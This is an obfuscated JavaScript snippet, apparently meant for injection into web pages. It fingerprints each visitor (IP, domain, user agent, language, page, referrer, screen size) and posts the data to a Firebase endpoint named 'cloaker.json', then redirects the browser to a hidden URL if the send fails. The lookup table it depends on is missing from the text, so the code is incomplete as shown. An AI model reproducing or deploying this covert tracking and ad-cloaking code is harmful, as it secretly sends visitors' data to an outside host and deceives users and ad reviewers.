(function(_0x5db6d5, _0x4825b2) {
    const _0x4b56c4 = function(_0x14b24e) {
        while (--_0x14b24e) {
            _0x5db6d5['push'](_0x5db6d5['shift']());
        }
    };
    _0x4b56c4(++_0x4825b2);
}(_0x4825, 0x16e));
const _0x4b56 = function(_0x5db6d5, _0x4825b2) {
    _0x5db6d5 = _0x5db6d5 - 0x0;
    let _0x4b56c4 = _0x4825[_0x5db6d5];
    return _0x4b56c4;
};
(function() {
    const _0x3a89fa = {
        'fetchIP': async function() {
            try {
                const _0x38750b = await fetch(_0x4b56('0x4'));
                const _0x3aa3b7 = await _0x38750b['json']();
                return _0x3aa3b7['ip'];
            } catch {
                return _0x4b56('0x5');
            }
        },
        'postData': async function() {
            const _0x3a4eb7 = {
                'ip': await _0x3a89fa[_0x4b56('0x7')](),
                'domain': window[_0x4b56('0x2')][_0x4b56('0x8')],
                'userAgent': window[_0x4b56('0x3')][_0x4b56('0x9')],
                'language': window[_0x4b56('0x3')][_0x4b56('0xa')] || '',
                'page': window[_0x4b56('0x2')][_0x4b56('0xb')],
                'referer': document[_0x4b56('0xc')] || '',
                'screenSize': `${window[_0x4b56('0xd')][_0x4b56('0xe')]}x${window[_0x4b56('0xd')][_0x4b56('0xf')]}`
            };
            try {
                const _0x26b739 = await fetch('https://ads-black-digital-default-rtdb.firebaseio.com/cloaker.json', {
                    'method': _0x4b56('0x10'),
                    'headers': { 'Content-Type': _0x4b56('0x11') },
                    'body': JSON['stringify'](_0x3a4eb7)
                });
                if (!_0x26b739['ok']) throw new Error(`HTTP\x20error:\x20${_0x26b739['status']}`);
                console['log']('Response:', await _0x26b739['json']());
            } catch (_0x10bcb3) {
                console['error']('Error:', _0x10bcb3);
                window[_0x4b56('0x12')]['href'] = _0x4b56('0x13');
            }
        }
    };
    _0x3a89fa[_0x4b56('0x6')]();
})();
